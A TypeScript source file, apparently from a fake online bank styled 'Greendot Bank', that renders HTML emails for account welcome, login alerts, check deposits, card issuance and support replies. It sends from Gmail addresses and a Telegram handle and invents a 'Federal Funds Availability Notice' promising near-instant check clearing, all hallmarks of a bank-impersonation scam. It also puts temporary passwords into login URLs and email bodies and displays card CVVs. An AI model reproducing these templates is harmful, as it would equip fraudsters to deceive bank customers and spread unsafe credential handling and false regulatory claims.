import { safeParseResponse } from './utils';

export interface EmailRenderOptions {
  recipientName?: string;
  recipientEmail: string;
  type:
    | 'activation'
    | 'welcome'
    | 'announcement'
    | 'debit_alert'
    | 'credit_alert'
    | 'generic'
    | 'customer_login_alert'
    | 'admin_new_check_alert'
    | 'admin_human_support_alert'
    | 'admin_customer_login_alert'
    | 'admin_card_issued_alert'
    | 'check_approval'
    | 'admin_reply_support';
  subject: string;
  siteUrl?: string;
  activationCode?: string;
  temporaryPassword?: string;
  customerId?: string;
  accountNumber?: string;
  amount?: number;
  balanceAfter?: number;
  reference?: string;
  senderName?: string;
  announcementCategory?: 'general' | 'security_alert' | 'maintenance' | 'policy_update';
  content?: string;
  supportEmail?: string;
  supportPhone?: string;
  telegramHandle?: string;

  // Security & Alert specific fields
  deviceInfo?: string;
  loginTime?: string;
  ipAddress?: string;
  approxLocation?: string;

  // Check deposit specific fields
  checkNumber?: string;
  checkAmount?: number;
  frontImage?: string;
  backImage?: string;
  immediateAmount?: number;
  remainingAmount?: number;

  // Support desk fields
  ticketId?: string;
  inquiryText?: string;
  adminReplyText?: string;

  // Card issuance fields
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
  initialBalance?: number;
  cardStatus?: string;
  adminName?: string;
}

export const TRANSACTIONAL_SENDER = 'Greendot Bank Support <greendot.bank.supportmail@gmail.com>';
export const ADMIN_NOTIFICATION_EMAIL = 'jade66oc@gmail.com';

export function renderBrandedEmailHtml(options: EmailRenderOptions): string {
  const {
    recipientName = 'Valued Customer',
    recipientEmail,
    type,
    subject,
    siteUrl,
    activationCode,
    temporaryPassword,
    customerId,
    accountNumber,
    amount,
    balanceAfter,
    reference,
    senderName,
    announcementCategory = 'general',
    content,
    supportEmail = 'greendot.bank.supportmail@gmail.com',
    supportPhone = '1-800-GREENDOT',
    telegramHandle = '@greendotbanksupport',
    deviceInfo,
    loginTime,
    ipAddress,
    approxLocation,
    checkNumber,
    checkAmount,
    frontImage,
    backImage,
    immediateAmount,
    remainingAmount,
    ticketId,
    inquiryText,
    adminReplyText,
    cardNumber,
    expiry,
    cvv,
    initialBalance,
    cardStatus,
    adminName,
  } = options;

  // Resolve base domain cleanly without trailing slash
  const resolvedBaseUrl = (
    siteUrl ||
    (typeof window !== 'undefined' && window.location.origin ? window.location.origin : '') ||
    'https://greendotbanking.com'
  ).replace(/\/+$/, '');

  const magicLoginUrl = `${resolvedBaseUrl}/login?email=${encodeURIComponent(recipientEmail)}&password=${encodeURIComponent(temporaryPassword || '')}`;
  const dashboardUrl = `${resolvedBaseUrl}/dashboard`;

  let headerTitle = 'Greendot Bank';
  let headerSubtitle = 'Secure Online Banking';
  let bodyContent = '';

  if (type === 'welcome') {
    headerTitle = 'Welcome to Greendot';
    headerSubtitle = 'Your account is now active';
    bodyContent = `
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.6; margin-bottom: 24px;">
        Dear <strong style="color: #ffffff;">${recipientName}</strong>,
        <br><br>
        Welcome to secure online banking with Greendot Bank. Your personal banking profile and primary account have been provisioned and <strong style="color: #34d399;">activated immediately</strong>. You may now sign in to monitor balances, manage cards, and execute domestic transfers.
      </div>

      <!-- Customer Summary Box -->
      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin: 20px 0; overflow: hidden;">
        <tr>
          <td style="padding: 16px 20px; border-bottom: 1px solid #1e293b;">
            <div style="font-size: 11px; text-transform: uppercase; font-weight: 700; color: #64748b; letter-spacing: 0.5px;">Account Summary</div>
          </td>
        </tr>
        <tr>
          <td style="padding: 14px 20px; border-bottom: 1px solid #1e293b;">
            <table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td style="font-size: 13px; color: #94a3b8; width: 40%;">Customer Name:</td>
                <td style="font-size: 13px; font-weight: 700; color: #f8fafc;">${recipientName}</td>
              </tr>
            </table>
          </td>
        </tr>
        <tr>
          <td style="padding: 14px 20px; border-bottom: 1px solid #1e293b;">
            <table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td style="font-size: 13px; color: #94a3b8; width: 40%;">Registered Email:</td>
                <td style="font-size: 13px; font-weight: 600; color: #f8fafc;">${recipientEmail}</td>
              </tr>
            </table>
          </td>
        </tr>
        <tr>
          <td style="padding: 14px 20px; border-bottom: 1px solid #1e293b;">
            <table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td style="font-size: 13px; color: #94a3b8; width: 40%;">Customer ID:</td>
                <td style="font-size: 13px; font-weight: 700; color: #10b981; font-family: 'SFMono-Regular', Consolas, Menlo, monospace;">${customerId || 'CUST-849201'}</td>
              </tr>
            </table>
          </td>
        </tr>
        <tr>
          <td style="padding: 14px 20px; border-bottom: 1px solid #1e293b;">
            <table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td style="font-size: 13px; color: #94a3b8; width: 40%;">Account Number:</td>
                <td style="font-size: 13px; font-weight: 700; color: #f8fafc; font-family: 'SFMono-Regular', Consolas, Menlo, monospace;">${accountNumber || '9482019482'}</td>
              </tr>
            </table>
          </td>
        </tr>
        <tr>
          <td style="padding: 14px 20px;">
            <table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td style="font-size: 13px; color: #94a3b8; width: 40%;">Temporary Password:</td>
                <td>
                  <span style="font-size: 14px; font-weight: 800; color: #fbbf24; font-family: 'SFMono-Regular', Consolas, Menlo, monospace; background-color: #1e293b; border: 1px solid #475569; padding: 4px 10px; border-radius: 6px; letter-spacing: 1px;">
                    ${temporaryPassword || 'Pass1234!'}
                  </span>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>

      <!-- Important Callout Box -->
      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: rgba(245, 158, 11, 0.08); border: 1px solid #f59e0b; border-left: 4px solid #f59e0b; border-radius: 8px; margin: 24px 0;">
        <tr>
          <td style="padding: 16px 18px;">
            <div style="font-size: 13px; font-weight: 700; color: #fbbf24; margin-bottom: 4px;">
              Important: For your security, please change your temporary password after your first login.
            </div>
            <div style="font-size: 12px; color: #fde68a; line-height: 1.5;">
              You can also set a personalized 4-digit transaction PIN under your profile security settings to authorize instant wire transfers.
            </div>
          </td>
        </tr>
      </table>

      <!-- Prominent Green Button -->
      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 32px 0 16px;">
        <tr>
          <td align="center">
            <a href="${magicLoginUrl}" style="background-color: #10b981; background-image: linear-gradient(135deg, #10b981 0%, #059669 100%); color: #ffffff; text-decoration: none; padding: 16px 36px; font-weight: 700; font-size: 16px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 14px rgba(16, 185, 129, 0.35); text-align: center; letter-spacing: -0.2px;">
              Login to Your Account
            </a>
            <div style="font-size: 12px; color: #94a3b8; margin-top: 10px;">
              Clicking above will automatically populate your email and temporary password for one-click access.
            </div>
          </td>
        </tr>
      </table>
    `;
  } else if (type === 'customer_login_alert') {
    headerTitle = 'Security Alert';
    headerSubtitle = 'New Login Detected';
    bodyContent = `
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.6; margin-bottom: 20px;">
        Dear <strong style="color: #ffffff;">${recipientName}</strong>,
        <br><br>
        We detected a successful sign-in to your Greendot online banking account. Please review the session details below to verify this activity:
      </div>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin: 20px 0; overflow: hidden; font-size: 13px;">
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b; width: 35%;">Date &amp; Time</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #f1f5f9; border-bottom: 1px solid #1e293b;">${loginTime || new Date().toLocaleString()}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Device / Browser</td>
          <td style="padding: 12px 18px; font-weight: 600; color: #38bdf8; border-bottom: 1px solid #1e293b;">${deviceInfo || 'Secure Web Session'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Location</td>
          <td style="padding: 12px 18px; font-weight: 600; color: #f1f5f9; border-bottom: 1px solid #1e293b;">${approxLocation || 'United States (Verified Network)'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8;">Status</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #34d399;">Authenticated &bull; Active</td>
        </tr>
      </table>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: rgba(239, 68, 68, 0.08); border: 1px solid #ef4444; border-left: 4px solid #ef4444; border-radius: 8px; margin: 20px 0;">
        <tr>
          <td style="padding: 14px 18px;">
            <div style="font-size: 13px; font-weight: 700; color: #f87171; margin-bottom: 4px;">
              Don't recognize this sign-in?
            </div>
            <div style="font-size: 12px; color: #fca5a5; line-height: 1.5;">
              If you did not perform this login, please immediately freeze your cards from your dashboard and notify our fraud prevention team at <strong style="color: #ffffff;">${supportEmail}</strong>.
            </div>
          </td>
        </tr>
      </table>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 28px 0 10px;">
        <tr>
          <td align="center">
            <a href="${dashboardUrl}" style="background-color: #10b981; color: #ffffff; text-decoration: none; padding: 14px 32px; font-weight: 700; font-size: 15px; border-radius: 10px; display: inline-block;">
              Go to Account Dashboard
            </a>
          </td>
        </tr>
      </table>
    `;
  } else if (type === 'admin_new_check_alert') {
    headerTitle = 'Admin Alert: New Check';
    headerSubtitle = 'Underwriting Review Required';
    bodyContent = `
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.6; margin-bottom: 20px;">
        A customer has submitted a new mobile check deposit requiring underwriting verification.
      </div>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin: 20px 0; overflow: hidden; font-size: 13px;">
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Customer Name</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #f1f5f9; border-bottom: 1px solid #1e293b;">${recipientName}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Customer ID</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #34d399; border-bottom: 1px solid #1e293b; font-family: monospace;">${customerId || 'CUST-ID'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Check Number</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #fbbf24; border-bottom: 1px solid #1e293b; font-family: monospace;">#${checkNumber || '0000'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Check Amount</td>
          <td style="padding: 12px 18px; font-weight: 800; color: #10b981; font-size: 16px; border-bottom: 1px solid #1e293b;">$${(checkAmount || amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Immediate Available Limit</td>
          <td style="padding: 12px 18px; font-weight: 600; color: #38bdf8; border-bottom: 1px solid #1e293b;">$${Math.min(225, (checkAmount || amount || 0)).toFixed(2)} (upon approval)</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8;">Remaining Balance (2-Hr Clear)</td>
          <td style="padding: 12px 18px; font-weight: 600; color: #fbbf24;">$${Math.max(0, (checkAmount || amount || 0) - 225).toFixed(2)}</td>
        </tr>
      </table>

      ${
        frontImage || backImage
          ? `
        <div style="margin: 20px 0;">
          <div style="font-size: 13px; font-weight: 700; color: #f8fafc; margin-bottom: 8px;">Check Image Photos:</div>
          <table width="100%" border="0" cellspacing="8" cellpadding="0">
            <tr>
              ${
                frontImage
                  ? `<td width="50%" align="center" style="background: #0f172a; padding: 8px; border-radius: 8px; border: 1px solid #334155;">
                      <div style="font-size: 11px; color: #94a3b8; margin-bottom: 4px;">Front of Check</div>
                      <img src="${frontImage}" alt="Front Check" style="max-width: 100%; height: auto; border-radius: 4px; display: block;" />
                     </td>`
                  : ''
              }
              ${
                backImage
                  ? `<td width="50%" align="center" style="background: #0f172a; padding: 8px; border-radius: 8px; border: 1px solid #334155;">
                      <div style="font-size: 11px; color: #94a3b8; margin-bottom: 4px;">Back of Check / Endorsement</div>
                      <img src="${backImage}" alt="Back Check" style="max-width: 100%; height: auto; border-radius: 4px; display: block;" />
                     </td>`
                  : ''
              }
            </tr>
          </table>
        </div>
      `
          : ''
      }

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 28px 0 10px;">
        <tr>
          <td align="center">
            <a href="${resolvedBaseUrl}/admin" style="background-color: #10b981; color: #ffffff; text-decoration: none; padding: 14px 32px; font-weight: 700; font-size: 15px; border-radius: 10px; display: inline-block;">
              Open Admin Underwriting Queue
            </a>
          </td>
        </tr>
      </table>
    `;
  } else if (type === 'admin_human_support_alert') {
    headerTitle = 'Support Escalation';
    headerSubtitle = 'Human Agent Required';
    bodyContent = `
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.6; margin-bottom: 20px;">
        A customer has requested human assistance in live AI support. Under the service policy, human specialist replies must be delivered within <strong>2 hours</strong>.
      </div>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin: 20px 0; overflow: hidden; font-size: 13px;">
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b; width: 35%;">Ticket / Session ID</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #fbbf24; border-bottom: 1px solid #1e293b; font-family: monospace;">#${ticketId || 'TICK-884'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Customer</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #f1f5f9; border-bottom: 1px solid #1e293b;">${recipientName} (${customerId || 'CUST-ID'})</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Customer Email</td>
          <td style="padding: 12px 18px; font-weight: 600; color: #38bdf8; border-bottom: 1px solid #1e293b;">${recipientEmail}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Inquiry Preview</td>
          <td style="padding: 12px 18px; font-weight: 500; color: #e2e8f0; border-bottom: 1px solid #1e293b;">"${inquiryText || 'Customer requested live specialist intervention'}"</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8;">SLA Response Window</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #f59e0b;">Within 2 Hours (Automated customer notification on reply)</td>
        </tr>
      </table>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 28px 0 10px;">
        <tr>
          <td align="center">
            <a href="${resolvedBaseUrl}/admin" style="background-color: #10b981; color: #ffffff; text-decoration: none; padding: 14px 32px; font-weight: 700; font-size: 15px; border-radius: 10px; display: inline-block;">
              Open AI &amp; Live Support Desk
            </a>
          </td>
        </tr>
      </table>
    `;
  } else if (type === 'admin_customer_login_alert') {
    headerTitle = 'Admin Audit';
    headerSubtitle = 'Customer Login Activity';
    bodyContent = `
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.6; margin-bottom: 20px;">
        Administrative notice: Customer <strong>${recipientName}</strong> has authenticated into online banking.
      </div>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin: 20px 0; overflow: hidden; font-size: 13px;">
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b; width: 35%;">Customer Name</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #f1f5f9; border-bottom: 1px solid #1e293b;">${recipientName}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Customer ID</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #34d399; border-bottom: 1px solid #1e293b; font-family: monospace;">${customerId || 'CUST-ID'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Email</td>
          <td style="padding: 12px 18px; font-weight: 600; color: #f1f5f9; border-bottom: 1px solid #1e293b;">${recipientEmail}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Login Time</td>
          <td style="padding: 12px 18px; font-weight: 600; color: #e2e8f0; border-bottom: 1px solid #1e293b;">${loginTime || new Date().toLocaleString()}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8;">Client User Agent</td>
          <td style="padding: 12px 18px; font-size: 12px; color: #94a3b8; font-family: monospace;">${deviceInfo || 'Standard Web'}</td>
        </tr>
      </table>
    `;
  } else if (type === 'admin_card_issued_alert') {
    headerTitle = 'Card Operations';
    headerSubtitle = 'Gold Visa Card Issued';
    bodyContent = `
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.6; margin-bottom: 20px;">
        Admin <strong>${adminName || 'Operations'}</strong> has provisioned and linked a Gold Visa Card for customer <strong>${recipientName}</strong>.
      </div>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin: 20px 0; overflow: hidden; font-size: 13px;">
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b; width: 35%;">Customer</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #f1f5f9; border-bottom: 1px solid #1e293b;">${recipientName} (${customerId || 'CUST-ID'})</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Card Number</td>
          <td style="padding: 12px 18px; font-weight: 800; color: #fbbf24; border-bottom: 1px solid #1e293b; font-family: monospace;">${cardNumber || '4532 •••• •••• 8821'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Expiry / CVV</td>
          <td style="padding: 12px 18px; font-weight: 600; color: #f1f5f9; border-bottom: 1px solid #1e293b; font-family: monospace;">${expiry || '12/29'} &bull; CVV: ${cvv || '•••'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Initial Loaded Balance</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #10b981; border-bottom: 1px solid #1e293b;">$${(initialBalance || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8;">Card Status</td>
          <td style="padding: 12px 18px; font-weight: 700; text-transform: uppercase; color: #34d399;">${cardStatus || 'ACTIVE'}</td>
        </tr>
      </table>

      <div style="font-size: 13px; color: #94a3b8; line-height: 1.5; margin-top: 16px;">
        All money-out features (external wire transfers, bill pay, and mobile recharges) are now unlocked for this customer across their banking dashboard.
      </div>
    `;
  } else if (type === 'check_approval') {
    headerTitle = 'Check Approved';
    headerSubtitle = 'Funds Availability Notice';
    const imm = immediateAmount ?? 225;
    const rem = remainingAmount ?? 0;
    bodyContent = `
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.6; margin-bottom: 20px;">
        Dear <strong style="color: #ffffff;">${recipientName}</strong>,
        <br><br>
        Great news! Your mobile check deposit #${checkNumber || 'DEPOSIT'} for <strong>$${(amount || checkAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong> has been approved by our underwriting team.
      </div>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin: 20px 0; overflow: hidden; font-size: 13px;">
        <tr>
          <td style="padding: 14px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b; width: 45%;">Available Immediately</td>
          <td style="padding: 14px 18px; font-weight: 800; color: #34d399; font-size: 16px; border-bottom: 1px solid #1e293b;">+$${imm.toLocaleString('en-US', { minimumFractionDigits: 2 })}</td>
        </tr>
        ${
          rem > 0
            ? `
        <tr>
          <td style="padding: 14px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Remaining Balance Clearing</td>
          <td style="padding: 14px 18px; font-weight: 700; color: #fbbf24; border-bottom: 1px solid #1e293b;">$${rem.toLocaleString('en-US', { minimumFractionDigits: 2 })} (Clears in 2 hours)</td>
        </tr>
        `
            : ''
        }
        <tr>
          <td style="padding: 14px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Credited Account</td>
          <td style="padding: 14px 18px; font-weight: 600; color: #f1f5f9; border-bottom: 1px solid #1e293b;">${accountNumber || 'Primary Checking'}</td>
        </tr>
        <tr>
          <td style="padding: 14px 18px; color: #94a3b8;">Total Check Value</td>
          <td style="padding: 14px 18px; font-weight: 700; color: #f1f5f9;">$${(amount || checkAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</td>
        </tr>
      </table>

      <!-- Funds Availability Policy Banner -->
      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: rgba(16, 185, 129, 0.08); border: 1px solid #10b981; border-left: 4px solid #10b981; border-radius: 8px; margin: 20px 0;">
        <tr>
          <td style="padding: 14px 18px;">
            <div style="font-size: 13px; font-weight: 700; color: #34d399; margin-bottom: 4px;">
              Federal Funds Availability Notice
            </div>
            <div style="font-size: 12px; color: #d1fae5; line-height: 1.5;">
              First $225.00 is available immediately upon deposit approval. Remaining funds clear automatically within the next 2 hours.
            </div>
          </td>
        </tr>
      </table>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 28px 0 10px;">
        <tr>
          <td align="center">
            <a href="${dashboardUrl}" style="background-color: #10b981; color: #ffffff; text-decoration: none; padding: 14px 32px; font-weight: 700; font-size: 15px; border-radius: 10px; display: inline-block;">
              View Account Balance
            </a>
          </td>
        </tr>
      </table>
    `;
  } else if (type === 'admin_reply_support') {
    headerTitle = 'Support Update';
    headerSubtitle = 'Message from Greendot Operations';
    bodyContent = `
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.6; margin-bottom: 20px;">
        Dear <strong style="color: #ffffff;">${recipientName}</strong>,
        <br><br>
        A senior support specialist has replied to your inquiry (Ticket #${ticketId || 'SUPPORT'}).
      </div>

      <div style="background-color: #0f172a; border: 1px solid #334155; border-left: 4px solid #38bdf8; border-radius: 12px; padding: 18px; margin: 20px 0;">
        <div style="font-size: 11px; text-transform: uppercase; font-weight: 800; color: #38bdf8; letter-spacing: 0.5px; margin-bottom: 8px;">
          Official Specialist Response:
        </div>
        <p style="color: #f8fafc; font-size: 14px; line-height: 1.7; margin: 0; white-space: pre-wrap;">
          ${adminReplyText || content || 'Your inquiry has been addressed by our operations desk.'}
        </p>
      </div>

      <div style="color: #94a3b8; font-size: 13px; line-height: 1.6; margin: 16px 0;">
        You can also continue this conversation or review previous logs directly in your online banking portal under <strong>Customer Support Center &gt; AI &amp; Live Chat</strong>.
      </div>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 28px 0 10px;">
        <tr>
          <td align="center">
            <a href="${dashboardUrl}" style="background-color: #10b981; color: #ffffff; text-decoration: none; padding: 14px 32px; font-weight: 700; font-size: 15px; border-radius: 10px; display: inline-block;">
              Open Support Center
            </a>
          </td>
        </tr>
      </table>
    `;
  } else if (type === 'activation') {
    headerTitle = 'Account Activation';
    headerSubtitle = 'Online Banking Ready';
    bodyContent = `
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.6; margin-bottom: 20px;">
        Hello <strong style="color: #ffffff;">${recipientName}</strong>,
        <br><br>
        Your Greendot banking profile is ready. You can log in directly to your online banking portal:
      </div>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #0f172a; border: 1px solid #334155; border-radius: 12px; margin: 20px 0;">
        <tr>
          <td style="padding: 20px; text-align: center;">
            <div style="font-size: 12px; font-weight: 700; color: #34d399; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px;">Customer Identification</div>
            <div style="font-size: 22px; font-weight: 800; color: #ffffff; font-family: monospace;">${customerId || 'CUST-849201'}</div>
          </td>
        </tr>
      </table>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 28px 0 10px;">
        <tr>
          <td align="center">
            <a href="${magicLoginUrl}" style="background-color: #10b981; background-image: linear-gradient(135deg, #10b981 0%, #059669 100%); color: #ffffff; text-decoration: none; padding: 14px 32px; font-weight: 700; font-size: 15px; border-radius: 10px; display: inline-block;">
              Sign In to Your Account
            </a>
          </td>
        </tr>
      </table>
    `;
  } else if (type === 'debit_alert') {
    headerTitle = 'Debit Notification';
    headerSubtitle = 'Transaction Notice';
    bodyContent = `
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.6; margin-bottom: 20px;">
        Dear <strong style="color: #ffffff;">${recipientName}</strong>,
        <br><br>
        A debit transaction occurred on your Greendot account.
      </div>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: rgba(239, 68, 68, 0.1); border: 1px solid #ef4444; border-left: 4px solid #ef4444; border-radius: 10px; margin: 20px 0;">
        <tr>
          <td style="padding: 18px 20px;">
            <div style="font-size: 26px; font-weight: 800; color: #f87171;">-$${(amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</div>
            <div style="color: #fca5a5; font-size: 13px; margin-top: 4px;">Debited from Account: ${accountNumber || 'Primary Checking'}</div>
          </td>
        </tr>
      </table>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #0f172a; border: 1px solid #334155; border-radius: 10px; margin: 20px 0; font-size: 13px;">
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Reference ID</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #f1f5f9; text-align: right; border-bottom: 1px solid #1e293b; font-family: monospace;">${reference || 'TXN-DEB-001'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Beneficiary / Merchant</td>
          <td style="padding: 12px 18px; font-weight: 600; color: #f1f5f9; text-align: right; border-bottom: 1px solid #1e293b;">${senderName || 'Authorized Debit'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8;">Remaining Balance</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #10b981; text-align: right; font-size: 14px;">$${(balanceAfter || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</td>
        </tr>
      </table>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 28px 0 10px;">
        <tr>
          <td align="center">
            <a href="${dashboardUrl}" style="background-color: #334155; color: #ffffff; text-decoration: none; padding: 12px 28px; font-weight: 600; font-size: 14px; border-radius: 8px; display: inline-block;">
              View Transaction History
            </a>
          </td>
        </tr>
      </table>
    `;
  } else if (type === 'credit_alert') {
    headerTitle = 'Deposit Notification';
    headerSubtitle = 'Funds Credited';
    bodyContent = `
      <div style="color: #cbd5e1; font-size: 15px; line-height: 1.6; margin-bottom: 20px;">
        Dear <strong style="color: #ffffff;">${recipientName}</strong>,
        <br><br>
        Funds have been deposited into your Greendot account.
      </div>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; border-left: 4px solid #10b981; border-radius: 10px; margin: 20px 0;">
        <tr>
          <td style="padding: 18px 20px;">
            <div style="font-size: 26px; font-weight: 800; color: #34d399;">+$${(amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</div>
            <div style="color: #a7f3d0; font-size: 13px; margin-top: 4px;">Credited to Account: ${accountNumber || 'Primary Checking'}</div>
          </td>
        </tr>
      </table>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #0f172a; border: 1px solid #334155; border-radius: 10px; margin: 20px 0; font-size: 13px;">
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Reference ID</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #f1f5f9; text-align: right; border-bottom: 1px solid #1e293b; font-family: monospace;">${reference || 'TXN-DEP-001'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8; border-bottom: 1px solid #1e293b;">Sender / Origin</td>
          <td style="padding: 12px 18px; font-weight: 600; color: #f1f5f9; text-align: right; border-bottom: 1px solid #1e293b;">${senderName || 'Federal Reserve Wire'}</td>
        </tr>
        <tr>
          <td style="padding: 12px 18px; color: #94a3b8;">New Total Balance</td>
          <td style="padding: 12px 18px; font-weight: 700; color: #34d399; text-align: right; font-size: 14px;">$${(balanceAfter || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</td>
        </tr>
      </table>

      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin: 28px 0 10px;">
        <tr>
          <td align="center">
            <a href="${dashboardUrl}" style="background-color: #10b981; color: #ffffff; text-decoration: none; padding: 12px 28px; font-weight: 700; font-size: 14px; border-radius: 8px; display: inline-block;">
              Access Online Banking
            </a>
          </td>
        </tr>
      </table>
    `;
  } else if (type === 'announcement') {
    const bannerColors = {
      general: { bg: 'rgba(16, 185, 129, 0.15)', text: '#34d399', label: 'OFFICIAL ANNOUNCEMENT' },
      security_alert: { bg: 'rgba(239, 68, 68, 0.15)', text: '#f87171', label: 'SECURITY ADVISORY' },
      maintenance: { bg: 'rgba(245, 158, 11, 0.15)', text: '#fbbf24', label: 'SCHEDULED MAINTENANCE' },
      policy_update: { bg: 'rgba(56, 189, 248, 0.15)', text: '#38bdf8', label: 'POLICY & TERMS UPDATE' },
    };
